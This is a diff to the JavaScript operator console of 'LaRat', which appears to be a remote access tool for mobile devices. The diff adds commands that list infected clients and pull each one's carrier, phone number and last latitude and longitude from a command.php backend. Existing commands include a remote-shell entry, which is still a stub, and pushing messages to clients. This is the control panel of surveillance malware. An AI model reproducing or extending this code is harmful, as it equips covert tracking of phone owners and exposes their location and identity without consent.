@@ -1,11 +1,12 @@
 var greeting = "Welcome to the LaRat Interactive Console! \n\
                   Commands:\n\
-                      list - lists availiable clients\n\
+                      get             - lists availiable clients\n\
                       add [clientId]  - adds client to current client array\n\
                       rm [clientId]   - removes client from client pool\n\
                       ssh [clientId]  - creates remote shell on client (client pool not supported)\n\
                       toast [message] - toasts message on clients in current client array\n\
-                      list            - lists clients in current client array";
+                      list            - lists clients in current client array\n\
+                      info [clientId] - lists the info of a given client";
 
 String.prototype.strip = function(char) {
     return this.replace(new RegExp("^" + char + "*"), '').
@@ -85,8 +86,18 @@ jQuery(document).ready(function($) {
 var commandList = {};
 var clientIds = [];
 
+var getClients = function(args, terminal) {
+    $.get( "command.php?command=getClients", function( result ) {
+        var json = JSON.parse(result);
+        json['clients'].forEach(function(client) {
+            terminal.echo("\t" + client['objectId']);
+        }
+        );
+    });
+}
+
 var list = function(args, terminal) {
-  terminal.echo("SHIM - list called");
+    terminal.echo("\t" + clientIds);
 }
 
 var add = function(args, terminal) {
@@ -94,7 +105,7 @@ var add = function(args, terminal) {
   if( $.inArray(clientId, clientIds) == -1 ) {
     clientIds.push(clientId);
   }
-  terminal.echo("Add client " + clientId);
+  terminal.echo("Added client " + clientId);
 }
 
 var rmv = function(args, terminal) {
@@ -107,7 +118,7 @@ var rmv = function(args, terminal) {
 
 var ssh = function(args, terminal) {
   var clientId = args[1];
-  terminal.echo("SSH to " + clientId);
+  terminal.echo("Starting remote SSH to " + clientId);
 }
 
 var toast = function(args, terminal) {
@@ -116,8 +127,34 @@ var toast = function(args, terminal) {
 }
 
 
-commandList["list"] = list;
+var getInfo = function(args, terminal) {
+    var client = args[1];
+    $.get( "command.php?command=getDetails&clientId=" + client, function( result ) {
+        var result = JSON.parse(result);
+        if(result['status'] == 'ok') {
+            var details = result['clientDetails'];
+            var info = details['info'][0];
+            var locationArray = details['location'][0];
+            var carrier = info['carrier'];
+            var phoneNumber = info['phoneNumber']
+            var location = "( " + locationArray['latitude'] + ", " + locationArray['longitude'] + " )";
+            
+            terminal.echo(
+                "\tCarrier: " + carrier + "\n" +
+                "\tPhone Number: " + phoneNumber + "\n" + 
+                "\tLast Locaiton: " + location + "\n"
+            );
+        } else {
+            terminal.echo(result['message']);
+        }
+        
+    });
+}
+
+commandList["get"] = getClients;
 commandList["add"] = add;
 commandList["rm"] = rmv;
 commandList["ssh"] = ssh;
 commandList["toast"] = toast;
+commandList['list'] = list;
+commandList['info'] = getInfo;
